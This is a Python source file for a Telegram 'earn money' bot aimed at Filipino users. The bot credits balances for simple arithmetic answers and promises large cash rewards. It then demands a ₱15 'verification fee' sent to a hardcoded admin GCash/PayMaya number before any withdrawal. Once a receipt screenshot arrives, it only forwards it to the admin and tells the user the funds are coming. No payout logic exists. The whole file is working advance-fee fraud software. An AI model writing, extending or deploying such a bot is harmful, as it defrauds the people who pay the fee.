import os
import sqlite3
import time
import random
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
BOT_USERNAME = "think2EarnBot"

ADMIN_ID = 775857744  # The bot will send proofs here
REFERRAL_REWARD = 48.88 
MIN_WITHDRAW = 1000
DAILY_LIMIT = 10
WITHDRAW_FEE = 15.00

# Admin's Payment Details (Where users send the fee)
ADMIN_GCASH = "09939775174"
ADMIN_PAYMAYA = "09939775174"

REWARDS = {"easy": 20, "medium": 40, "hard": 88}
TIME_LIMIT = {"easy": 20, "medium": 15, "hard": 10}

# ================== DATABASE ==================
db = sqlite3.connect("think2earn.db", check_same_thread=False)
cur = db.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    balance REAL DEFAULT 0,
    all_time_balance REAL DEFAULT 0,
    streak INTEGER DEFAULT 0,
    daily_count INTEGER DEFAULT 0,
    last_day INTEGER DEFAULT 0
)
""")

cur.execute("CREATE TABLE IF NOT EXISTS referrals (referrer INTEGER, referred INTEGER UNIQUE)")
db.commit()

pending = {} 

# ================== QUESTIONS ==================
LOGIC_QUESTIONS = [("What has keys but no locks?", "keyboard"), ("What gets wetter as it dries?", "towel")]

def math_question(level):
    if level == "easy": a, b = random.randint(1, 10), random.randint(1, 10); return f"{a} + {b} = ?", str(a + b)
    elif level == "medium": a, b = random.randint(10, 50), random.randint(5, 30); return f"{a} - {b} = ?", str(a - b)
    else: a, b = random.randint(5, 20), random.randint(5, 15); return f"{a} × {b} = ?", str(a * b)

# ================== HELPERS ==================
def today(): return int(time.time() // 86400)

def ensure_user(uid):
    cur.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (uid,))
    db.commit()

def reset_daily(uid):
    cur.execute("SELECT last_day FROM users WHERE user_id=?", (uid,))
    row = cur.fetchone()
    if row and row[0] != today():
        cur.execute("UPDATE users SET daily_count=0, last_day=? WHERE user_id=?", (today(), uid))
        db.commit()

# ================== UI ==================
def main_menu():
    keyboard = [
        [InlineKeyboardButton("GUESS THE LOGO EARN 88 💸", callback_data="math")],
        [InlineKeyboardButton("Account Balance 💰", callback_data="balance")],
        [InlineKeyboardButton(f"Invite Friends Earn {REFERRAL_REWARD} PHP 💸", callback_data="referrals")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")]
    ]
    return InlineKeyboardMarkup(keyboard)

def withdrawal_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("GCash", callback_data="wd_gcash")],
        [InlineKeyboardButton("PayMaya", callback_data="wd_paymaya")],
        [InlineKeyboardButton("⬅ Back", callback_data="back")]
    ])

# ================== COMMANDS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ensure_user(uid)
    reset_daily(uid)
    
    promo_text = (
        "<b>GRABE FREE 2,500 PESOS NA BIGAYAN NGAYON!</b>\n\n"
        "NEW UPDATE TO SOBRANG LAKI NA BIGAYAN INSTANT 2,500 PESOS AFTER VERIFYING LANG.\n\n"
        "👇 <b>CLICK BUTTONS BELOW TO START EARNING</b> 👇"
    )
    await update.message.reply_text(promo_text, reply_markup=main_menu(), parse_mode="HTML")

# ================== BUTTON HANDLER ==================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "math":
        await query.edit_message_text("🎯 Select difficulty:", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🟢 Easy (₱20)", callback_data="math_easy")],
            [InlineKeyboardButton("🟡 Medium (₱40)", callback_data="math_medium")],
            [InlineKeyboardButton("🔴 Hard (₱88)", callback_data="math_hard")]
        ]))

    elif query.data.startswith("math_"):
        level = query.data.split("_")[1]
        question, answer = math_question(level)
        pending[uid] = {"answer": answer.lower(), "time": time.time(), "level": level}
        await query.message.reply_text(f"⏱ {TIME_LIMIT[level]}s\n❓ <b>{question}</b>", parse_mode="HTML")

    elif query.data == "balance":
        cur.execute("SELECT balance FROM users WHERE user_id=?", (uid,))
        balance = cur.fetchone()[0]
        await query.message.reply_text(f"💰 Balance: ₱{balance:.2f}", reply_markup=main_menu())

    elif query.data == "withdraw":
        await query.edit_message_text("💸 Choose withdrawal method:", reply_markup=withdrawal_menu())

    elif query.data.startswith("wd_"):
        method = "GCash" if "gcash" in query.data else "PayMaya"
        pending[uid] = {"wd_method": method, "step": "GET_NUMBER"}
        await query.message.reply_text(f"📱 Enter your {method} Number:")

    elif query.data == "back":
        await query.edit_message_text("🏠 Main Menu", reply_markup=main_menu())

# ================== TEXT HANDLER (Logic for Number & Amount) ==================
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    txt = update.message.text

    if uid not in pending: return

    # 1. Handle Answer Logic
    if "answer" in pending[uid]:
        data = pending.pop(uid)
        if txt.lower() == data["answer"]:
            reward = REWARDS[data["level"]]
            cur.execute("UPDATE users SET balance=balance+? WHERE user_id=?", (reward, uid))
            db.commit()
            await update.message.reply_text(f"✅ Correct! +₱{reward}")
        else:
            await update.message.reply_text("❌ Wrong.")
        return

    # 2. Withdrawal Step: Get Wallet Number
    if pending[uid].get("step") == "GET_NUMBER":
        pending[uid]["wallet_number"] = txt
        pending[uid]["step"] = "GET_AMOUNT"
        await update.message.reply_text(f"💰 Enter amount to withdraw (Min: ₱{MIN_WITHDRAW}):")
        return

    # 3. Withdrawal Step: Get Amount
    if pending[uid].get("step") == "GET_AMOUNT":
        try:
            amt = float(txt)
            if amt < MIN_WITHDRAW:
                await update.message.reply_text(f"❌ Minimum is ₱{MIN_WITHDRAW}. Enter again:")
                return
            
            cur.execute("SELECT balance FROM users WHERE user_id=?", (uid,))
            bal = cur.fetchone()[0]
            if bal < amt:
                await update.message.reply_text(f"❌ Insufficient balance (₱{bal:.2f}). Enter again:")
                return

            pending[uid]["amt"] = amt
            pending[uid]["step"] = "AWAIT_PROOF"
            
            method = pending[uid]["wd_method"]
            admin_num = ADMIN_GCASH if method == "GCash" else ADMIN_PAYMAYA
            
            fee_msg = (
                f"⚠️ <b>Withdrawal Fee Required</b>\n\n"
                f"To process your ₱{amt} withdrawal, you must pay a <b>₱{WITHDRAW_FEE}</b> verification fee.\n\n"
                f"Send ₱{WITHDRAW_FEE} to this {method} account:\n"
                f"📞 <code>{admin_num}</code>\n\n"
                f"📸 <b>After paying, send the Screenshot/Receipt here as proof.</b>"
            )
            await update.message.reply_text(fee_msg, parse_mode="HTML")
        except ValueError:
            await update.message.reply_text("❌ Invalid number. Enter amount:")

# ================== PHOTO HANDLER (Proof of Payment) ==================
async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if uid in pending and pending[uid].get("step") == "AWAIT_PROOF":
        data = pending.pop(uid) # Remove from pending once proof is sent
        photo_file = update.message.photo[-1].file_id
        
        # 1. Notify Admin
        admin_alert = (
            f"🔔 <b>NEW WITHDRAWAL REQUEST</b>\n\n"
            f"👤 User ID: <code>{uid}</code>\n"
            f"💰 Amount: ₱{data['amt']}\n"
            f"📱 {data['wd_method']} No: {data['wallet_number']}\n"
            f"💳 Fee Paid: ₱{WITHDRAW_FEE}"
        )
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo_file, caption=admin_alert, parse_mode="HTML")
        
        # 2. Notify User
        await update.message.reply_text(
            "✅ <b>Proof Received!</b>\n\n"
            "Your transaction is now being processed. It usually takes 1-24 hours for the funds to arrive in your account.",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text("❌ Please start the withdrawal process first by clicking the 'Withdraw' button.")

# ================== SERVER & MAIN ==================
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b"Bot Alive")

if __name__ == "__main__":
    threading.Thread(target=lambda: HTTPServer(('0.0.0.0', int(os.environ.get("PORT", 8080))), SimpleHandler).serve_forever(), daemon=True).start()
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(MessageHandler(filters.PHOTO, photo_handler)) # Added photo handler
    
    print("Bot is running...")
    app.run_polling()
